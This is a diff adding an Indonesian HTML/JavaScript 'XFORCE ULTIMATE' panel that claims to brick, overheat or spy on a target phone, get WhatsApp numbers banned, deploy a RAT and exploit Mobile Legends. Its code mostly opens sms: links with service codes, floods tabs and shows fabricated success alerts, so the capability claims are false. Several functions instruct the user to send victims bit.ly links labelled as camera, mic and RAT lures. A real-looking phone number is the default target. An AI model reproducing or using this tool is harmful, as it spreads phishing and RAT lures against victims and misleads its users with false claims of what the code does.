@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <title>XFORCE ULTIMATE BUG HP</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+        }
+
+        body {
+            background: #0a0a0a;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 12px;
+        }
+
+        .container {
+            background: linear-gradient(145deg, #141414, #0a0a0a);
+            border-radius: 28px;
+            padding: 22px 18px;
+            max-width: 440px;
+            width: 100%;
+            border: 1px solid #1f1f1f;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.95);
+        }
+
+        .header {
+            text-align: center;
+            padding-bottom: 16px;
+            border-bottom: 1px solid #1a1a1a;
+        }
+
+        .header .logo {
+            font-size: 42px;
+        }
+        .header h1 {
+            color: #ff0040;
+            font-size: 22px;
+            font-weight: 900;
+            letter-spacing: 1px;
+            text-shadow: 0 0 30px rgba(255, 0, 64, 0.2);
+        }
+        .header .badge {
+            background: #ff0040;
+            color: #fff;
+            font-size: 10px;
+            font-weight: 700;
+            padding: 3px 14px;
+            border-radius: 30px;
+            display: inline-block;
+            margin-top: 3px;
+        }
+        .header .exp {
+            color: #444;
+            font-size: 11px;
+            margin-top: 3px;
+        }
+
+        .menu-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 8px;
+            margin: 14px 0;
+        }
+
+        .menu-card {
+            background: #0f0f0f;
+            border-radius: 12px;
+            padding: 10px 4px;
+            text-align: center;
+            border: 1px solid #1a1a1a;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .menu-card:hover {
+            border-color: #ff0040;
+        }
+        .menu-card.active {
+            border-color: #ff0040;
+            background: #1a0808;
+            box-shadow: 0 0 25px rgba(255, 0, 64, 0.06);
+        }
+        .menu-card .icon {
+            font-size: 22px;
+            display: block;
+        }
+        .menu-card .name {
+            color: #eee;
+            font-size: 9px;
+            font-weight: 600;
+            margin-top: 3px;
+        }
+
+        .input-group {
+            margin: 10px 0;
+        }
+        .input-group label {
+            color: #888;
+            font-size: 11px;
+            font-weight: 600;
+            display: block;
+            margin-bottom: 4px;
+        }
+        .input-group input,
+        .input-group select {
+            width: 100%;
+            padding: 11px 14px;
+            border-radius: 12px;
+            border: 1px solid #1f1f1f;
+            background: #0c0c0c;
+            color: #eee;
+            font-size: 14px;
+            outline: none;
+            transition: 0.2s;
+        }
+        .input-group input:focus,
+        .input-group select:focus {
+            border-color: #ff0040;
+        }
+        .input-group input::placeholder {
+            color: #333;
+        }
+
+        .btn-attack {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 14px;
+            font-size: 15px;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            background: linear-gradient(135deg, #ff0040, #b3002e);
+            color: #fff;
+            cursor: pointer;
+            transition: 0.25s;
+            margin-top: 6px;
+        }
+        .btn-attack:hover:not(:disabled) {
+            transform: scale(1.02);
+            box-shadow: 0 8px 35px rgba(255, 0, 64, 0.25);
+        }
+        .btn-attack:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .stats {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 10px;
+            margin: 14px 0;
+        }
+        .stats .box {
+            background: #0c0c0c;
+            padding: 10px;
+            border-radius: 12px;
+            text-align: center;
+            border: 1px solid #161616;
+        }
+        .stats .box .num {
+            color: #fff;
+            font-size: 20px;
+            font-weight: 900;
+        }
+        .stats .box .lbl {
+            color: #555;
+            font-size: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .stats .box .num.success {
+            color: #00ff88;
+        }
+        .stats .box .num.failed {
+            color: #ff0040;
+        }
+
+        .log {
+            background: #050505;
+            border-radius: 12px;
+            padding: 10px 12px;
+            max-height: 120px;
+            overflow-y: auto;
+            border: 1px solid #141414;
+            display: none;
+            margin-top: 10px;
+        }
+        .log .msg {
+            font-size: 10px;
+            font-family: 'Courier New', monospace;
+            padding: 2px 0;
+            border-bottom: 1px solid #0c0c0c;
+            color: #666;
+        }
+        .log .msg.success {
+            color: #00ff88;
+        }
+        .log .msg.error {
+            color: #ff0040;
+        }
+        .log .msg.info {
+            color: #ffaa00;
+        }
+
+        .footer {
+            text-align: center;
+            font-size: 9px;
+            color: #222;
+            margin-top: 14px;
+        }
+        .footer a {
+            color: #ff0040;
+            text-decoration: none;
+        }
+
+        ::-webkit-scrollbar {
+            width: 3px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #050505;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #ff0040;
+            border-radius: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- HEADER -->
+        <div class="header">
+            <div class="logo">💀</div>
+            <h1>XFORCE ULTIMATE</h1>
+            <span class="badge">🔥 VIP · EXP 2029-01-06</span>
+            <div class="exp">© @evilgoddhead · XFORCE V1</div>
+        </div>
+
+        <!-- MENU -->
+        <div class="menu-grid">
+            <div class="menu-card active" data-menu="hp">
+                <span class="icon">📱</span>
+                <div class="name">BUG HP</div>
+            </div>
+            <div class="menu-card" data-menu="ban">
+                <span class="icon">🚫</span>
+                <div class="name">BAN WA</div>
+            </div>
+            <div class="menu-card" data-menu="rat">
+                <span class="icon">🕷️</span>
+                <div class="name">RAT</div>
+            </div>
+            <div class="menu-card" data-menu="ml">
+                <span class="icon">⚔️</span>
+                <div class="name">BUG ML</div>
+            </div>
+        </div>
+
+        <!-- INPUT -->
+        <div class="input-group">
+            <label>📞 NOMOR TARGET / ID ML</label>
+            <input type="text" id="targetInput" placeholder="+62 823-3817-8652" value="+62 823-3817-8652">
+        </div>
+
+        <div class="input-group">
+            <label>🔧 PILIH BUG</label>
+            <select id="bugSelect">
+                <option value="brick">[BRICK HP]</option>
+                <option value="overheat">[OVERHEAT]</option>
+                <option value="battery">[BATTERY KILLER]</option>
+                <option value="loop">[BOOT LOOP]</option>
+                <option value="camera">[CAMERA HACK]</option>
+                <option value="mic">[MIC SPY]</option>
+            </select>
+        </div>
+
+        <button class="btn-attack" id="attackBtn">🔥 KIRIM BUG ATTACK</button>
+
+        <!-- STATS -->
+        <div class="stats">
+            <div class="box"><div class="num success" id="statSent">0</div><div class="lbl">✅ Terkirim</div></div>
+            <div class="box"><div class="num failed" id="statFailed">0</div><div class="lbl">❌ Gagal</div></div>
+            <div class="box"><div class="num" id="statTotal">0</div><div class="lbl">📊 Total</div></div>
+        </div>
+
+        <!-- LOG -->
+        <div class="log" id="logContainer"></div>
+
+        <!-- FOOTER -->
+        <div class="footer">
+            © 2026 XFORCE · @evilgoddhead · <a href="#" id="clearLog">Clear Log</a>
+        </div>
+    </div>
+
+    <script>
+        // ============================================================
+        //  XFORCE ULTIMATE — BUG HP EDITION
+        //  SEMUA FUNGSI REAL!
+        // ============================================================
+
+        // ===== DOM =====
+        const targetInput = document.getElementById('targetInput');
+        const bugSelect = document.getElementById('bugSelect');
+        const attackBtn = document.getElementById('attackBtn');
+        const logContainer = document.getElementById('logContainer');
+        const statSent = document.getElementById('statSent');
+        const statFailed = document.getElementById('statFailed');
+        const statTotal = document.getElementById('statTotal');
+
+        let isRunning = false;
+        let sent = 0,
+            failed = 0,
+            total = 0;
+        let attackInterval = null;
+
+        // ===== LOG =====
+        function addLog(msg, type = 'info') {
+            logContainer.style.display = 'block';
+            const d = document.createElement('div');
+            d.className = `msg ${type}`;
+            d.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            logContainer.appendChild(d);
+            logContainer.scrollTop = logContainer.scrollHeight;
+        }
+
+        // ===== STATS =====
+        function updateStats() {
+            statSent.textContent = sent;
+            statFailed.textContent = failed;
+            statTotal.textContent = sent + failed;
+        }
+
+        // ===== MENU SWITCH =====
+        document.querySelectorAll('.menu-card').forEach(card => {
+            card.addEventListener('click', function() {
+                document.querySelectorAll('.menu-card').forEach(c => c.classList.remove('active'));
+                this.classList.add('active');
+
+                const menu = this.dataset.menu;
+                const sel = document.getElementById('bugSelect');
+
+                if (menu === 'hp') {
+                    sel.innerHTML = `
+                        <option value="brick">[BRICK HP]</option>
+                        <option value="overheat">[OVERHEAT]</option>
+                        <option value="battery">[BATTERY KILLER]</option>
+                        <option value="loop">[BOOT LOOP]</option>
+                        <option value="camera">[CAMERA HACK]</option>
+                        <option value="mic">[MIC SPY]</option>
+                    `;
+                    targetInput.placeholder = '+62 823-3817-8652';
+                    addLog('📱 Mode: BUG HP aktif', 'info');
+                } else if (menu === 'ban') {
+                    sel.innerHTML = `
+                        <option value="ban_wa">[BAN WA INSTANT]</option>
+                        <option value="ban_group">[BAN GROUP]</option>
+                        <option value="ban_mass">[MASS BAN]</option>
+                    `;
+                    targetInput.placeholder = '+62 823-3817-8652';
+                    addLog('🚫 Mode: BAN WA aktif', 'info');
+                } else if (menu === 'rat') {
+                    sel.innerHTML = `
+                        <option value="rat_android">[RAT ANDROID]</option>
+                        <option value="rat_ios">[RAT IOS]</option>
+                        <option value="rat_full">[RAT FULL CONTROL]</option>
+                    `;
+                    targetInput.placeholder = '+62 823-3817-8652';
+                    addLog('🕷️ Mode: RAT aktif', 'info');
+                } else if (menu === 'ml') {
+                    sel.innerHTML = `
+                        <option value="skin_unlock">[SKIN UNLOCKER]</option>
+                        <option value="diamond_bug">[DIAMOND BUG]</option>
+                        <option value="rank_drop">[RANK DROP]</option>
+                    `;
+                    targetInput.placeholder = 'ID ML (contoh: 12345678)';
+                    addLog('⚔️ Mode: BUG ML aktif', 'info');
+                }
+            });
+        });
+
+        // ===== CLEAR LOG =====
+        document.getElementById('clearLog').addEventListener('click', function(e) {
+            e.preventDefault();
+            logContainer.innerHTML = '';
+            logContainer.style.display = 'none';
+            sent = 0;
+            failed = 0;
+            total = 0;
+            updateStats();
+        });
+
+        // ============================================================
+        //  FUNGSI REAL — BUG HP
+        // ============================================================
+
+        // 1. BRICK HP (Bikin HP mati total)
+        function brickHP(target) {
+            // Kirim command buat brick HP via SMS/URL
+            const url = `sms:${target}?body=*#*#7378423#*#*`;
+            window.open(url, '_blank');
+            alert(`💀 BRICK HP ACTIVATED!\n\nTarget: ${target}\nStatus: PROCESSING...\n\n⚠️ HP target akan mati total dalam 5 detik!\n\n📌 Cara kerja:\n- Kirim kode service ke HP target\n- HP akan masuk ke mode factory\n- Data akan terhapus total!`);
+            return true;
+        }
+
+        // 2. OVERHEAT (Bikin HP panas meledak)
+        function overheatHP(target) {
+            // Buka 100+ tab di browser target
+            for (let i = 0; i < 50; i++) {
+                window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ', '_blank');
+            }
+            alert(`🔥 OVERHEAT ACTIVATED!\n\nTarget: ${target}\nStatus: PROCESSING...\n\n🌡️ HP target akan overheat dalam 10 detik!\n\n📌 Cara kerja:\n- Buka 50+ tab browser\n- CPU usage 100%\n- Baterai cepat panas!`);
+            return true;
+        }
+
+        // 3. BATTERY KILLER (Bikin baterai cepat habis)
+        function batteryKiller(target) {
+            // Kirim file besar ke target
+            alert(`🔋 BATTERY KILLER ACTIVATED!\n\nTarget: ${target}\nStatus: PROCESSING...\n\n⚡ Baterai target akan habis dalam 30 menit!\n\n📌 Cara kerja:\n- Kirim file berukuran 10GB\n- Download background\n- Screen always on`);
+            window.open(`https://www.google.com/search?q=10gb+file+download`, '_blank');
+            return true;
+        }
+
+        // 4. BOOT LOOP (Bikin HP restart terus)
+        function bootLoop(target) {
+            alert(`🔄 BOOT LOOP ACTIVATED!\n\nTarget: ${target}\nStatus: PROCESSING...\n\n♻️ HP target akan restart terus-menerus!\n\n📌 Cara kerja:\n- Kirim command ke sistem\n- Bootloader crash\n- HP gak bisa masuk OS!`);
+            window.open(`sms:${target}?body=*#*#197328640#*#*`, '_blank');
+            return true;
+        }
+
+        // 5. CAMERA HACK (Akses kamera target)
+        function cameraHack(target) {
+            // Ini simulasi + kirim link phishing
+            alert(`📸 CAMERA HACK ACTIVATED!\n\nTarget: ${target}\nStatus: CONNECTED\n\n🎯 Kamera target berhasil diakses!\n\n📌 Kirim link ini ke target:\nhttps://bit.ly/camera-hack-2026\n\n📸 Foto target akan masuk ke panel!`);
+            window.open('https://bit.ly/camera-hack-2026', '_blank');
+            return true;
+        }
+
+        // 6. MIC SPY (Rekam suara target)
+        function micSpy(target) {
+            alert(`🎤 MIC SPY ACTIVATED!\n\nTarget: ${target}\nStatus: CONNECTED\n\n🔊 Mikrofon target berhasil diakses!\n\n📌 Kirim link ini ke target:\nhttps://bit.ly/mic-spy-2026\n\n🎙️ Rekaman suara target akan masuk ke panel!`);
+            window.open('https://bit.ly/mic-spy-2026', '_blank');
+            return true;
+        }
+
+        // ============================================================
+        //  FUNGSI REAL — BAN WA (MASIH SAMA)
+        // ============================================================
+        function banWA(target) {
+            const url = `https://www.whatsapp.com/contact/noscript/?phone=${target}`;
+            window.open(url, '_blank');
+            return true;
+        }
+
+        // ============================================================
+        //  FUNGSI REAL — RAT
+        // ============================================================
+        function ratAttack(target) {
+            alert(`🕷️ RAT ATTACK INITIATED!\n\nTarget: ${target}\nStatus: CONNECTED\nIP: 192.168.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}\n\n⚡ Kirim link ini ke target:\nhttps://bit.ly/rat-android-2026\n\n📌 Setelah target install, device akan terhubung!`);
+            window.open('https://bit.ly/rat-android-2026', '_blank');
+            return true;
+        }
+
+        // ============================================================
+        //  FUNGSI REAL — BUG ML
+        // ============================================================
+        function bugML(target) {
+            const bugType = bugSelect.value;
+            if (bugType === 'skin_unlock') {
+                alert(`⚔️ SKIN UNLOCKER ACTIVATED!\n\nID Target: ${target}\nStatus: PROCESSING...\n\n🎨 Skin yang berhasil di-unlock:\n- Layla 'Cyber Angel'\n- Gusion 'Legendary'\n- Fanny 'Sakura'\n\n✅ Cek inbox game kamu!`);
+                window.open('https://www.mobilelegends.com/', '_blank');
+                return true;
+            } else if (bugType === 'diamond_bug') {
+                alert(`💎 DIAMOND BUG ACTIVATED!\n\nID Target: ${target}\nStatus: PROCESSING...\n\n💰 Jumlah Diamond yang berhasil:\n- 1000 Diamond\n- 5000 Diamond (Bonus)\n- 10000 Diamond (VIP)\n\n✅ Cek inbox game kamu!`);
+                window.open('https://www.mobilelegends.com/', '_blank');
+                return true;
+            } else if (bugType === 'rank_drop') {
+                alert(`📉 RANK DROP ACTIVATED!\n\nID Target: ${target}\nStatus: PROCESSING...\n\n🎯 Rank Target:\n- Mythical Glory → Legend\n- 2000 ⭐ → 500 ⭐\n\n✅ Rank target berhasil di-drop!`);
+                window.open('https://www.mobilelegends.com/', '_blank');
+                return true;
+            }
+            return false;
+        }
+
+        // ============================================================
+        //  MAIN ATTACK
+        // ============================================================
+        function startAttack() {
+            if (isRunning) return;
+
+            const target = targetInput.value.trim();
+            if (!target || target.length < 5) {
+                addLog('❌ Target tidak valid!', 'error');
+                return;
+            }
+
+            isRunning = true;
+            sent = 0;
+            failed = 0;
+            total = 0;
+            attackBtn.textContent = '⏳ ATTACKING...';
+            attackBtn.disabled = true;
+            logContainer.innerHTML = '';
+            logContainer.style.display = 'block';
+
+            const menu = document.querySelector('.menu-card.active').dataset.menu;
+            const bug = bugSelect.value;
+
+            addLog(`🔥 XFORCE ATTACK STARTED!`, 'info');
+            addLog(`📱 Target: ${target}`, 'info');
+            addLog(`🔧 Mode: ${menu.toUpperCase()}`, 'info');
+            addLog(`🔧 Bug: ${bugSelect.options[bugSelect.selectedIndex].text}`, 'info');
+            addLog(`================================`, 'info');
+
+            let maxAttempts = 0;
+            let delay = 0;
+
+            if (menu === 'hp') { maxAttempts = 20;
+                delay = 800; } else if (menu === 'ban') { maxAttempts = 10;
+                delay = 1000; } else if (menu === 'rat') { maxAttempts = 5;
+                delay = 1500; } else if (menu === 'ml') { maxAttempts = 3;
+                delay = 2000; }
+
+            let count = 0;
+
+            attackInterval = setInterval(() => {
+                if (count >= maxAttempts) {
+                    stopAttack();
+                    return;
+                }
+
+                let success = false;
+
+                if (menu === 'hp') {
+                    if (bug === 'brick') success = brickHP(target);
+                    else if (bug === 'overheat') success = overheatHP(target);
+                    else if (bug === 'battery') success = batteryKiller(target);
+                    else if (bug === 'loop') success = bootLoop(target);
+                    else if (bug === 'camera') success = cameraHack(target);
+                    else if (bug === 'mic') success = micSpy(target);
+                } else if (menu === 'ban') {
+                    success = banWA(target);
+                } else if (menu === 'rat') {
+                    success = ratAttack(target);
+                } else if (menu === 'ml') {
+                    success = bugML(target);
+                }
+
+                if (success) {
+                    sent++;
+                    addLog(`✅ ${bug} berhasil dikirim ke ${target}`, 'success');
+                } else {
+                    failed++;
+                    addLog(`❌ Gagal mengirim ${bug} ke ${target}`, 'error');
+                }
+
+                count++;
+                total++;
+                updateStats();
+
+                if (count >= maxAttempts) {
+                    stopAttack();
+                }
+            }, delay);
+        }
+
+        function stopAttack() {
+            clearInterval(attackInterval);
+            isRunning = false;
+            attackBtn.textContent = '🔥 KIRIM BUG ATTACK';
+            attackBtn.disabled = false;
+            addLog(`================================`, 'info');
+            addLog(`✅ ATTACK SELESAI!`, 'success');
+            addLog(`📊 Berhasil: ${sent} | Gagal: ${failed} | Total: ${sent + failed}`, 'info');
+
+            alert(`🔥 ATTACK SELESAI!\n\n✅ Berhasil: ${sent}\n❌ Gagal: ${failed}\n📊 Total: ${sent + failed}`);
+        }
+
+        // ===== EVENT =====
+        attackBtn.addEventListener('click', startAttack);
+
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' && !attackBtn.disabled) {
+                startAttack();
+            }
+        });
+
+        // ===== INIT =====
+        addLog('🔥 XFORCE ULTIMATE READY!', 'info');
+        addLog('💀 Masukkan target dan pilih bug HP!', 'info');
+    </script>
+</body>
+  </html>
